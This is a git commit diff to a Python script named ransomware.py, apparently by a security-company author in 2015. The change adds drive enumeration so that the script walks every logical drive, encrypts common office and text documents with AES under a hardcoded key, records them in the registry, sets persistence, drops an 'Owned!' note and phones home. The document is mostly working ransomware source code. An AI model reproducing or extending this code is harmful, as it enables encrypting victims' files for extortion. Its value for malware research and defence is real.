c0fc5a42ed1e3a9961cea1dcebb3489effe20736
Ryan Cobb <rcobb@secureworks.com>
2015-01-28 16:07:12 -0500

    Updated Drive Identification
    Compiled version

--- ransomware.py
+++ ransomware.py
@@ -5,6 +5,7 @@ import struct
 import win32com.client
 import time
 import sys
+import win32api
 from _winreg import *
 
 from Crypto.PublicKey import RSA
@@ -12,6 +13,7 @@ from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Cipher import AES
 
 def GenerateCert():
+
 	new_key = RSA.generate(2048, e=65537)
 	
 	public_key = new_key.publickey().exportKey('PEM')
@@ -23,23 +25,24 @@ def GenerateCert():
 	
 	
 def GenerateAESKey(password):
+
 	aes_key	= hashlib.sha256(password).digest()
 	
 	return aes_key
 	
 	
-def FindDocuments():
+def FindDocuments(drive):
 	'''Returns a generator of files with the target extensions'''
-	documents = [os.path.normpath(os.path.join(parent, filename)) for parent, directories, filenames in os.walk('C:\\') 
-																  for filename in filenames 
-																  if os.path.splitext(filename)[1] in target_extensions]
+	documents = [os.path.normpath(os.path.join(parent, filename)) 
+				for parent, directories, filenames in os.walk(drive) 
+				for filename in filenames 
+				if os.path.splitext(filename)[1] in target_extensions]
 												
 	return documents
 	
 	
 def EncryptDocument(document_path):
 	'''This section was modified from eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto'''
-	
 	keyVal = r'SOFTWARE\Ransomware\Files'
 	
 	try:
@@ -104,6 +107,7 @@ def DecryptDocument(document_path):
 		
 		
 def PhoneHome():
+
 	def wait_for_browser(browser):
 		while browser.ReadyState != 4 and browser.ReadyState != 'complete':
 			time.sleep(0.1)
@@ -150,26 +154,31 @@ def RecordEncryptedDocs(docs):
 	CloseKey(key)
 
 	
+def GetDriveLetters():
+
+	drives = win32api.GetLogicalDriveStrings()
+	drives = drives.split('\000')[:-1]
+	
+	return drives
+	
+	
 if __name__ == '__main__':
+
 	target_extensions = ['.txt', '.docx', '.doc', '.xls', '.xlsx', '.ppt', '.pptx']
 	
 	aes_key = GenerateAESKey('kitty')
 
+	drives = GetDriveLetters()
+	
+	for drive in drives:
+		docs = FindDocuments(drive)
+		RecordEncryptedDocs(docs)
+		for doc in docs:
+			EncryptDocument(doc)
+			
+	ObtainPersistence()
+	
 	with open('C:\\DecryptInstructions.txt', 'w+') as DecryptInstructions:
 		DecryptInstructions.write('Owned!')
-		
-	docs = FindDocuments()
 	
-	for doc in docs:
-		EncryptDocument(doc)
-		
-	RecordEncryptedDocs(docs)
-	
-	ObtainPersistence()
 	PhoneHome()
-	
-		
-		
-		
-		
-		
